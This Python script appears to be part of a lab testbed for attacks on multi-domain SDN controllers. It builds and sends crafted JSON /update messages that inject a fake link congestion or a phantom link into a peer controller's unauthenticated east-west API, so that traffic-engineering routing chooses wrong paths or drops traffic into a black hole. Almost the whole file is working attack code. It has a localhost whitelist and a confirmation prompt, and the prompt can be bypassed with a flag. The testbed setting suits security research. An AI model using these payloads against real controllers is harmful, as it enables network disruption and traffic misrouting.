#!/usr/bin/env python3
"""
attacks/topology_poison.py
---------------------------
Phase 5 — Attack Module 3: Topology Poisoning (Novel, Low-Volume)

Strategy
────────
A compromised controller (simulated here) sends a single crafted POST
/update payload to one or more of its peers, injecting FALSE topology
or link-state data.  Because the EW REST API merges peer updates without
authentication, the lie is accepted and propagates into global_topology —
causing the TE path selector to make INCORRECT routing decisions on the
next new flow.

Two lie modes (selectable via --lie-type):

  congestion_lie
    Report a well-utilised low-latency link (e.g. s3↔s4, A–B boundary)
    as heavily congested (ratio=0.95).  The TE controller will avoid this
    link for new flows even though it is actually free.

  phantom_link
    Report a non-existent link (e.g. between DPIDs 2 and 8) as active.
    Depending on the path-selector's Dijkstra implementation this can
    route traffic to a black hole.

This is a low-volume attack — a single crafted HTTP POST is sufficient.
safe_rate_ramp() is therefore not used, but confirm_before_run() and
validate_target() are MANDATORY.

Safety harness
──────────────
  1. validate_target()     — port whitelist (8080/8081/8082 on 127.0.0.1)
  2. confirm_before_run()  — interactive yes/no gate
  (No rate ramp or watchdog needed: it is a one-shot message, not a flood)

Run examples:
    python3 attacks/topology_poison.py \
        --target-port 8081 \
        --lie-type congestion_lie \
        --src-dpid 3 \
        --dst-dpid 4 \
        --fake-ratio 0.95

    python3 attacks/topology_poison.py \
        --target-port 8082 \
        --lie-type phantom_link \
        --src-dpid 2 \
        --dst-dpid 8
"""

from __future__ import annotations

import argparse
import logging
import os
import sys
import time
from datetime import datetime, timezone

import requests

# ── Project path ──────────────────────────────────────────────────────────────
_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_HERE)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from attacks.safety import (
    confirm_before_run,
    UnsafeTargetError,
)

# ── Allowed targets: controller REST ports on localhost ONLY ─────────────────
KNOWN_EW_PORTS: dict[str, int] = {"A": 8080, "B": 8081, "C": 8082}
_ALLOWED_PORTS = set(KNOWN_EW_PORTS.values())
_EW_HOST       = "127.0.0.1"

# ── Logging ───────────────────────────────────────────────────────────────────
RESULTS_DIR = os.path.join(_ROOT, "results")
os.makedirs(RESULTS_DIR, exist_ok=True)

_ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
LOG_FILE = os.path.join(RESULTS_DIR, f"attack_topo_poison_{_ts}.log")

_fmt = logging.Formatter(
    "%(asctime)s  %(levelname)-8s  %(message)s", datefmt="%Y-%m-%dT%H:%M:%S"
)
_fh = logging.FileHandler(LOG_FILE, mode="w", encoding="utf-8")
_sh = logging.StreamHandler(sys.stdout)
for _h in (_fh, _sh):
    _h.setFormatter(_fmt)

log = logging.getLogger("topology_poison")
log.setLevel(logging.DEBUG)
log.propagate = False
log.addHandler(_fh)
log.addHandler(_sh)

# ── Lie payload builders ──────────────────────────────────────────────────────

def _congestion_lie(src_dpid: int, dst_dpid: int, fake_ratio: float) -> dict:
    """
    Lie: report an existing low-utilisation link as heavily congested.

    The /update type='linkstate' path triggers gt.merge_peer_link_state()
    AND directly updates util_rates (the dict checked by path_selector).
    We use both to maximise the chance the TE engine sees the lie.
    """
    fake_bps = int(fake_ratio * 10_000_000)  # 10 Mbps link assumed
    port_data = {
        "ratio":  fake_ratio,
        "bps_tx": fake_bps,
        "bps_rx": fake_bps,
    }
    return {
        "type":       "linkstate",
        "domain_id":  "ROGUE",
        "seq":        9999,
        # Merge into link_state (byte counters — less critical)
        "link_state": {
            str(src_dpid): {
                "1": {"tx_bytes": fake_bps * 60, "rx_bytes": 0},
                "2": {"tx_bytes": fake_bps * 60, "rx_bytes": 0},
                "3": {"tx_bytes": fake_bps * 60, "rx_bytes": 0},
            }
        },
        # Merge into util_rates (ratio — what path_selector actually reads)
        "util_rates": {
            str(src_dpid): {
                "3": port_data,   # port 3 = inter-domain boundary port (s3↔s4 / s6↔s7)
                "4": port_data,   # port 4 = A↔C diagonal boundary port
            },
            str(dst_dpid): {
                "3": port_data,
                "4": port_data,
            },
        },
    }


def _phantom_link(src_dpid: int, dst_dpid: int) -> dict:
    """
    Lie: report a non-existent link between src_dpid and dst_dpid.

    This is injected as a topology update so gt.merge_peer_topology()
    adds the phantom link to global_topology's link table.
    Depending on path-selector behaviour this may route traffic to a
    non-existent path (black hole) or create unexpected shortcuts.
    """
    return {
        "type":      "topology",
        "domain_id": "ROGUE",
        "seq":       9999,
        "switches": {
            str(src_dpid): {
                "dpid":   src_dpid,
                "domain": "ROGUE",
                "ports":  [1, 2, 3, 4, 5],
            },
            str(dst_dpid): {
                "dpid":   dst_dpid,
                "domain": "ROGUE",
                "ports":  [1, 2, 3, 4, 5],
            },
        },
        "links": [
            {
                "src_dpid": src_dpid,
                "src_port": 99,   # obviously bogus port numbers
                "dst_dpid": dst_dpid,
                "dst_port": 99,
            }
        ],
        "inter_links": [
            {
                "src_dpid": src_dpid,
                "src_port": 99,
                "dst_dpid": dst_dpid,
                "dst_port": 99,
            }
        ],
        "hosts": {},
    }


# ── Target validation (same whitelist as eastwest_flood.py) ──────────────────

def validate_poison_target(port: int) -> None:
    if port not in _ALLOWED_PORTS:
        raise UnsafeTargetError(
            f"Refusing port {port}: only controller REST ports "
            f"{sorted(_ALLOWED_PORTS)} (127.0.0.1) are permitted."
        )


# ── Send one poison message ───────────────────────────────────────────────────

def send_poison(url: str, payload: dict, lie_type: str) -> bool:
    """POST one crafted /update payload and return True on HTTP 200."""
    headers = {
        "Content-Type": "application/json",
        "X-Domain-Id":  "ROGUE",
    }
    log.info("Sending %s payload to %s", lie_type, url)
    log.debug("  Payload: %s", payload)
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=5.0)
        log.info("  Response: HTTP %d  body=%s", resp.status_code,
                 resp.text[:200])
        return resp.status_code == 200
    except Exception as exc:
        log.error("  Request failed: %s", exc)
        return False


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Topology poisoning — send a single crafted EW /update payload to "
            "inject false topology/link-state data into a peer controller.  "
            "Only localhost ports 8080/8081/8082 are accepted."
        )
    )
    parser.add_argument("--target-port", type=int, default=8081,
                        choices=list(_ALLOWED_PORTS),
                        help="Victim controller REST port (8080 / 8081 / 8082)")
    parser.add_argument("--lie-type", choices=["congestion_lie", "phantom_link"],
                        default="congestion_lie",
                        help=(
                            "congestion_lie: report an existing link as heavily "
                            "congested so TE avoids it.  "
                            "phantom_link: report a non-existent link."
                        ))
    parser.add_argument("--src-dpid", type=int, default=3,
                        help="Source DPID for the fabricated link")
    parser.add_argument("--dst-dpid", type=int, default=4,
                        help="Destination DPID for the fabricated link")
    parser.add_argument("--fake-ratio", type=float, default=0.95,
                        help="(congestion_lie only) fake utilisation ratio 0–1")
    parser.add_argument("--repeat", type=int, default=1,
                        help="Number of times to send the poison message (default 1)")
    parser.add_argument("--repeat-interval", type=float, default=5.0,
                        help="Seconds between repeat sends (default 5)")
    parser.add_argument("--yes",             action="store_true",
                        help="Bypass interactive confirmation")
    args = parser.parse_args()

    port     = args.target_port
    lie_type = args.lie_type
    url      = f"http://{_EW_HOST}:{port}/update"

    # ── Safety gate 1: validate target port ──────────────────────────────────
    log.info("Validating target: %s", url)
    try:
        validate_poison_target(port)
    except UnsafeTargetError as exc:
        log.error("SAFETY VIOLATION — %s", exc)
        print(f"\n[BLOCKED] {exc}", file=sys.stderr)
        return 2

    domain_name = next(
        (f"Domain-{d}" for d, p in KNOWN_EW_PORTS.items() if p == port), "Unknown"
    )

    # ── Build the lie payload ─────────────────────────────────────────────────
    if lie_type == "congestion_lie":
        payload = _congestion_lie(args.src_dpid, args.dst_dpid, args.fake_ratio)
        lie_desc = (
            f"Reporting s{args.src_dpid}↔s{args.dst_dpid} as {args.fake_ratio:.0%} "
            f"congested (actual: low utilisation)"
        )
    else:  # phantom_link
        payload = _phantom_link(args.src_dpid, args.dst_dpid)
        lie_desc = (
            f"Reporting non-existent link s{args.src_dpid}↔s{args.dst_dpid} "
            f"as active (port 99)"
        )

    # ── Safety gate 2: interactive confirmation ───────────────────────────────
    confirmed = confirm_before_run(
        attack_name=f"Topology Poisoning ({lie_type})",
        target=f"{url}  ({domain_name})",
        rate=f"1 crafted message × {args.repeat} repeat(s)",
        duration=max(int(args.repeat * args.repeat_interval) + 10, 15),
        auto_confirm=args.yes,
    )
    if not confirmed:
        log.info("User aborted. No message sent.")
        return 0

    # ── Send the lie ──────────────────────────────────────────────────────────
    start_ts = datetime.now(timezone.utc).isoformat()
    log.info("=" * 60)
    log.info("ATTACK START  %s", start_ts)
    log.info("  Lie type        : %s", lie_type)
    log.info("  Description     : %s", lie_desc)
    log.info("  Target          : %s  (%s)", url, domain_name)
    log.info("  src_dpid        : %d  (s%d)", args.src_dpid, args.src_dpid)
    log.info("  dst_dpid        : %d  (s%d)", args.dst_dpid, args.dst_dpid)
    if lie_type == "congestion_lie":
        log.info("  Fake util ratio : %.2f  (%d%%)", args.fake_ratio,
                 int(args.fake_ratio * 100))
    log.info("  Repeats         : %d  (interval %.1fs)", args.repeat,
             args.repeat_interval)
    log.info("  Log file        : %s", LOG_FILE)
    log.info("=" * 60)

    success_count = 0
    for i in range(1, args.repeat + 1):
        log.info("[%d/%d] Sending poison...", i, args.repeat)
        ok = send_poison(url, payload, lie_type)
        if ok:
            success_count += 1
            log.info("  [%d/%d] Accepted by target. Lie is now in global_topology.", i, args.repeat)
        else:
            log.warning("  [%d/%d] Target rejected or unreachable.", i, args.repeat)

        if i < args.repeat:
            time.sleep(args.repeat_interval)

    # ── Summary ───────────────────────────────────────────────────────────────
    stop_ts = datetime.now(timezone.utc).isoformat()
    log.info("=" * 60)
    log.info("ATTACK STOP   %s", stop_ts)
    log.info("  Messages sent   : %d", args.repeat)
    log.info("  Accepted (200)  : %d", success_count)
    log.info("  Lie type        : %s", lie_type)
    log.info("  Expected effect : TE will make incorrect path decisions on")
    log.info("                    next flow that crosses s%d–s%d",
             args.src_dpid, args.dst_dpid)
    log.info("  VERIFY by:      : checking te_decisions.log for path changes,")
    log.info("                    or tracing a new iperf flow after this attack.")
    log.info("  Log file        : %s", LOG_FILE)
    log.info("=" * 60)

    return 0 if success_count == args.repeat else 1


if __name__ == "__main__":
    raise SystemExit(main())
